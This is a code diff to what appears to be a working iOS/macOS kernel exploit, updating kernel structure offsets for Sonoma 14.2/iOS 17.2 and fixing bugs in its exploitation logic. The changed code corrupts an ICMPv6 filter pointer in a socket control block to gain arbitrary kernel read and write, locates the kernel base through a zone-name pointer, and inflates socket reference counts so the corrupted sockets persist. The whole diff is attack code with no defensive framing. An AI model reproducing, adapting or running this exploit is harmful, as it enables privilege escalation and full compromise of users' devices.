@@ -25,11 +25,32 @@ void IOSurfacePrefetchPages(IOSurfaceRef surface);
         sleep(2);                                                              \
     }
 
-#define OFFSET_PCB_SOCKET 0x40
-#define OFFSET_SOCKET_SO_COUNT 0x228
-#define OFFSET_ICMP6FILT (0x138 + 0x18)
-#define OFFSET_SO_PROTO 0x18
-#define OFFSET_PR_INPUT 0x28
+// Obtained offsets from Sonoma 14.2 (KDK), also similar with iOS 17.2
+#define OFFSET_INPCB_PCB_SOCKET 0x40 //(lldb) p/x offsetof(inpcb, inp_socket)
+#define OFFSET_SOCKET_SO_COUNT 0x24c //(lldb) p/x offsetof(socket, so_usecount)
+#define OFFSET_INPCB_INP_DEPEND6_INP6_ICMP6FILT                                \
+    (0x148) //(lldb) p/x offsetof(inpcb, inp_depend6.inp6_icmp6filt)
+#define OFFSET_SOCKET_SO_PROTO 0x18   //(lldb) p/x offsetof(socket, so_proto)
+#define OFFSET_PROTOSW_PR_INPUT 0x28  //(lldb) p/x offsetof(protosw, pr_input)
+#define OFFSET_INPCB_INP_LIST 0x20    //(lldb) p/x offsetof(inpcb, inp_list)
+#define OFFSET_INPCB_INP_PCBINFO 0x38 //(lldb) p/x offsetof(inpcb, inp_pcbinfo)
+#define OFFSET_INPCB_INP_DEPEND6_INP6_CHKSUM                                   \
+    0x150 //(lldb) p/x offsetof(inpcb, inp_depend6.inp6_cksum)
+#define OFFSET_INPCB_INP_LIST_LE_NEXT                                          \
+    0x20 //(lldb) p/x offsetof(inpcb, inp_list.le_next)
+#define OFFSET_INPCBINFO_IPI_ZONE                                              \
+    0x68 //(lldb) p/x offsetof(inpcbinfo, ipi_zone)
+#define OFFSET_KALLOC_TYPE_VIEW_KT_ZV_ZV_NAME                                  \
+    0x10 //(lldb) p/x offsetof(kalloc_type_view, kt_zv.zv_name)
+
+/* + OFFSET_INPCB_INP_DEPEND6_INP6_ICMP6FILT + 8
+ 00000018     icmp6_filter *inp6_icmp6filt;
+ 00000020     int inp6_cksum; <- point this
+ 00000024     __int16 inp6_hops; <- point this 2
+ 00000026     // padding byte
+ 00000027     // padding byte
+ 00000028 };
+*/
 
 #define OOB_OFFSET 0x100
 #define OOB_SIZE 0xf00
@@ -422,7 +443,7 @@ void early_kread(uint64_t where, void *read_buf, size_t size) {
         FAILURE(0);
     }
     set_target_kaddr(where);
-    socklen_t read_data_length = size;
+    socklen_t read_data_length = (socklen_t)size;
     int res = getsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, read_buf,
                          &read_data_length);
     if (res != 0) {
@@ -472,15 +493,16 @@ int find_and_corrupt_socket(mach_port_t memoryObject,
                        executableName, strlen(executableName));
         if (found) {
             pcbStartOffset =
-                (uint64_t)found - (uint64_t)readBuffer & 0xFFFFFFFFFFFFFC00;
+                ((uint64_t)found - (uint64_t)readBuffer) & 0xFFFFFFFFFFFFFC00;
             if (*(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset +
-                              OFFSET_ICMP6FILT + 8)) {
+                              OFFSET_INPCB_INP_DEPEND6_INP6_CHKSUM) ==
+                0x0000ffffffffffffULL) {
                 targetFound = true;
                 break;
             }
         }
         searchStartIdx += 0x400;
-    } while (found == NULL && searchStartIdx < OOB_SIZE);
+    } while (found != NULL && searchStartIdx < OOB_SIZE);
 
     if (targetFound) {
         printf("[+] pcbStartOffset: %#llx\n", pcbStartOffset);
@@ -513,16 +535,18 @@ int find_and_corrupt_socket(mach_port_t memoryObject,
         }
         uint64_t inpListNextPointer =
             *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + 0x28) - 0x20;
-        uint64_t icmp6Filter = *(uint64_t *)((uintptr_t)readBuffer +
-                                             pcbStartOffset + OFFSET_ICMP6FILT);
+        uint64_t icmp6Filter =
+            *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset +
+                          OFFSET_INPCB_INP_DEPEND6_INP6_ICMP6FILT);
         printf("[+] inpListNextPointer: %#llx\n", inpListNextPointer);
         printf("[+] icmp6Filter: %#llx\n", icmp6Filter);
         rwSocketPcb = inpListNextPointer;
         memcpy(writeBuffer, readBuffer, OOB_SIZE);
         *(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset +
-                      OFFSET_ICMP6FILT) = inpListNextPointer + OFFSET_ICMP6FILT;
+                      OFFSET_INPCB_INP_DEPEND6_INP6_ICMP6FILT) =
+            inpListNextPointer + OFFSET_INPCB_INP_DEPEND6_INP6_ICMP6FILT;
         *(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset +
-                      OFFSET_ICMP6FILT + 8) = 0;
+                      OFFSET_INPCB_INP_DEPEND6_INP6_CHKSUM) = 0;
 
         printf("[+] Corrupting icmp6filter pointer...\n");
         while (true) {
@@ -532,11 +556,12 @@ int find_and_corrupt_socket(mach_port_t memoryObject,
                                             OOB_SIZE, OOB_OFFSET, readBuffer);
             uint64_t newIcmp6Filter =
                 *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset +
-                              OFFSET_ICMP6FILT);
-            if (newIcmp6Filter == inpListNextPointer + OFFSET_ICMP6FILT) {
+                              OFFSET_INPCB_INP_DEPEND6_INP6_ICMP6FILT);
+            if (newIcmp6Filter ==
+                inpListNextPointer + OFFSET_INPCB_INP_DEPEND6_INP6_ICMP6FILT) {
                 printf("[+] target corrupted: %#llx\n",
                        *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset +
-                                     OFFSET_ICMP6FILT));
+                                     OFFSET_INPCB_INP_DEPEND6_INP6_ICMP6FILT));
                 break;
             }
         }
@@ -597,7 +622,7 @@ void pe_v1(void) {
         if (isA18Device) {
             surface_mlock(wiredMapping, wiredMappingSize);
             for (int s = 0; s < (wiredMappingSize / 0x4000); s++) {
-                *(uint64_t *)(wiredMapping + s + 0x4000) = 0;
+                *(uint64_t *)(wiredMapping + s * PAGE_SIZE) = 0;
             }
         }
         NSMutableArray<NSNumber *> *searchMappings = [NSMutableArray new];
@@ -698,8 +723,9 @@ void pe_v2(void) {
 
 void krw_sockets_leak_forever(void) {
     uint64_t controlSocketAddr =
-        early_kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
-    uint64_t rwSocketAddr = early_kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
+        early_kread64(controlSocketPcb + OFFSET_INPCB_PCB_SOCKET);
+    uint64_t rwSocketAddr =
+        early_kread64(rwSocketPcb + OFFSET_INPCB_PCB_SOCKET);
 
     if (!controlSocketAddr || !rwSocketAddr) {
         printf("[-] Couldn't find controlSocketAddr || rwSocketAddr\n");
@@ -715,13 +741,13 @@ void krw_sockets_leak_forever(void) {
     early_kwrite64(rwSocketAddr + OFFSET_SOCKET_SO_COUNT,
                    rwSocketSoCount + 0x0000100100001001);
 
-    early_kwrite64(rwSocketPcb + OFFSET_ICMP6FILT + 8, 0);
+    early_kwrite64(rwSocketPcb + OFFSET_INPCB_INP_DEPEND6_INP6_CHKSUM, 0);
 }
 
 uint64_t kernel_base;
 uint64_t kernel_slide;
 
-int main(int argc, char *argv[]) {
+int kexploit_opa334(void) {
     init_globals();
     struct utsname name;
     uname(&name);
@@ -748,20 +774,16 @@ int main(int argc, char *argv[]) {
     close(writeFd);
     close(readFd);
 
-    controlSocketPcb = early_kread64(rwSocketPcb + 0x20);
-    krw_sockets_leak_forever();
+    controlSocketPcb =
+        early_kread64(rwSocketPcb + OFFSET_INPCB_INP_LIST_LE_NEXT);
+    uint64_t pcbinfo_pointer =
+        early_kread64(controlSocketPcb + OFFSET_INPCB_INP_PCBINFO);
+    uint64_t ipi_zone =
+        early_kread64(pcbinfo_pointer + OFFSET_INPCBINFO_IPI_ZONE);
+    uint64_t zv_name =
+        early_kread64(ipi_zone + OFFSET_KALLOC_TYPE_VIEW_KT_ZV_ZV_NAME);
 
-    uint64_t socketPtr =
-        early_kread64(controlSocketPcb + OFFSET_PCB_SOCKET); // inpcb->socket
-    // PRINT_VAR(socketPtr);
-    uint64_t protoPtr =
-        early_kread64(socketPtr + OFFSET_SO_PROTO); // socket->so_proto
-    // PRINT_VAR(protoPtr);
-    uint64_t textPtr =
-        __xpaci(early_kread64(protoPtr + OFFSET_PR_INPUT)); // protosw->pr_input
-    // PRINT_VAR(textPtr);
-
-    kernel_base = textPtr & 0xFFFFFFFFFFFFC000;
+    kernel_base = zv_name & 0xFFFFFFFFFFFFC000;
     while (true) {
         // PRINT_VAR(kernel_base);
         if (early_kread64(kernel_base) == 0x100000cfeedfacf) {
@@ -781,6 +803,9 @@ int main(int argc, char *argv[]) {
            early_kread64(kernel_base));
 
     printf("win??\n");
+
+    krw_sockets_leak_forever();
+
     fflush(stdout);
     sleep(1);
 
